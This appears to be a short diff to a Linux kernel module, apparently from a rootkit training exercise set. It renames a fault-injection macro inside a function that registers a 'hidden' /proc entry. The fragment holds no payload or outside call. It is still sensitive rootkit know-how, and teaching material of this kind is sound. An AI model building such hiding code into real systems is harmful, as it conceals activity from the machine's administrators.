@@ -29,7 +29,7 @@ __must_check int rk_hidden_proc_publish(void)
 {
 	if (hidden_entry)
 		return -EINVAL;
-	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_HIDDEN_PUBLISH)
+	if (RKLINGS_FAIL_POINT == RK_FAIL_HIDDEN_PUBLISH)
 		hidden_entry = NULL;
 	else
 		hidden_entry = proc_create(RK_DIRECTORY_TARGET, 0400, NULL,
